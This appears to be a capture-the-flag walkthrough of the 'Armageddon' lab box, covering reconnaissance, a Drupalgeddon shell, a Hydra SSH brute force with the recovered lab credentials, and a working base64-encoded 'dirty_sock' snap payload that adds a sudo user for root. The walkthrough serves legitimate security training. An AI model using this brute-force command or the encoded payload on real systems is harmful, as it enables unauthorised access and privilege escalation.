# Armageddon
## Information Gathering
Armageddon
10.10.10.233

Versions
- OpenSSH 7.4
- Apache/2.4.6 (CentOS) PHP/5.4.16
- Drupal 7.56

## Scanning
Of course start with your nmap scan:

```bash
# Nmap 7.92 scan initiated Tue Apr  5 10:52:35 2022 as: nmap -sC -sV -oN nmap/arm.nmap 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  5 10:52:45 2022 -- 1 IP address (1 host up) scanned in 10.38 seconds
```

I also run a Gobuster scan:

```bash
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/index.php            (Status: 200) [Size: 7440]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/install.php          (Status: 200) [Size: 3172]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/update.php           (Status: 403) [Size: 4057]
/README.txt           (Status: 200) [Size: 5382]
/robots.txt           (Status: 200) [Size: 2189]
/cron.php             (Status: 403) [Size: 7388]
/INSTALL.txt          (Status: 200) [Size: 17995]
/LICENSE.txt          (Status: 200) [Size: 18092]
/CHANGELOG.txt        (Status: 200) [Size: 111613]
/xmlrpc.php           (Status: 200) [Size: 42]
/COPYRIGHT.txt        (Status: 200) [Size: 1481]
/UPGRADE.txt          (Status: 200) [Size: 10123]
/authorize.php        (Status: 403) [Size: 2824]
```

There are many great tools online to enumerate CMS. A great one I found was [droopscan](https://github.com/SamJoan/droopescan) which enumerates several types of CMS. However, looking at the nmap results shows [Drupal](https://www.drupal.org/) a back-end framework for websites. Using droopscan gives some very good 
fingerprinting of this web application.

```bash
./droopescan scan drupal -u http://10.10.10.233                                                                                                                                          
[+] Plugins found:                                                              
    profile http://10.10.10.233/modules/profile/
    php http://10.10.10.233/modules/php/
    image http://10.10.10.233/modules/image/

[+] Themes found:
    seven http://10.10.10.233/themes/seven/
    garland http://10.10.10.233/themes/garland/

[+] Possible version(s):
    7.56

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.233/CHANGELOG.txt

[+] Scan finished (0:00:56.579125 elapsed)
```

Doing some research on Drupal 7.56 shows a series of exploits known as 'DrupalgeddonX' which aligns with the name of the box. 

After trying some exploits out, I found that [this](https://www.exploit-db.com/exploits/44449) CVE got us a wonky shell. The apache user has very low privileges thus, we are limited to what is in the /var/www/html directory. Looking at the users on the box (using cat /etc/passwd) shows a user **brucetherealadmin**. I look around the CMS files to see if there are any files which may store this users password in real text. Doing **grep -r password** shows that there is a password stored for the internal MySQL database in sites/default/settings.php {'database':'drupal','username':'drupaluser','password':'CQHEy@9M\*m23gBVj'}. I was never able to access the database.

Exhausting my options, I run Hydra against SSH using the known username.
```bash
hydra -t 4 -l brucetherealadmin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.233
```

After a few minutes, I got credentials:
**brucetherealadmin:booboo**

## Privilege Escalation
Running **sudo -l** reveals what I can run sudo as without permissions
```bash
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install 
```

I used [this](https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1) AV to get root. Creating a malicious snap package

```bash
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
```

Then installing the package

```bash
sudo snap install payload.snap --dangerous --devmode
```

Allows you to switch to the dirty_sock user. Lastly, dirty_sock can perform **sudo -i** to become root.